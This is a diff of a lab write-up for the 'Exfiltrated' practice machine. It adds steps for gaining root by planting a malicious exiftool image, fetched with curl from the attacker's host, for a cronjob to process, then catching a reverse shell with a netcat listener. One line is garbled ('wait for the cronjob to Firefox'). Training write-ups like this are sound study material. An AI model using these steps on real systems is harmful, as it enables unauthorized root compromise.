@@ -1,6 +1,6 @@
 ---
 title: Exfiltrated
-date: 2023-12-05
+date: 2023-12-07
 tags:
   - OSCP
   - PG Practice
@@ -332,3 +332,26 @@ From the scan results, we can see a cronjob is running.
 From the /opt directory, user `www-data` does not have write privileges.
 - reading the script `image-exif.sh` shows that it is executing the command `exiftool`
 
+The following [Arbitrary Code Execution](https://www.exploit-db.com/exploits/50911) script will generate an image that will be processed by the cronjob
+- run the script using `-s` flag and your kali IP and port
+![exiftool](./exiftool.png)
+
+Move to the `/var/www/html/subrion/uploads/` directory on the target then download the image from host
+- this will download the image file into the directory that the cronjob is processing
+```
+curl http://<kali_ip>/image.jpg -o image.jpg
+```
+
+Start a netcat listener on port specified when creating the `image.jpg` file. In my case, port 4444.
+```
+nc -lnvp 4444
+```
+- then wait for the cronjob to Firefox
+![root](./root.png)
+
+# Summary
+The blog post "Exfiltrated" outlines the exploitation of a Linux machine by leveraging an arbitrary file upload vulnerability in Subrion CMS v4.2.1. The author gains initial access as www-data through a modified Python script, further enhancing control with a PHP reverse shell. Privilege escalation is achieved by exploiting a cronjob through a crafted image file, ultimately securing root access on the target machine.
+
+Join me for the next machine soon for more exciting challenges and security insights!
+
++10 points
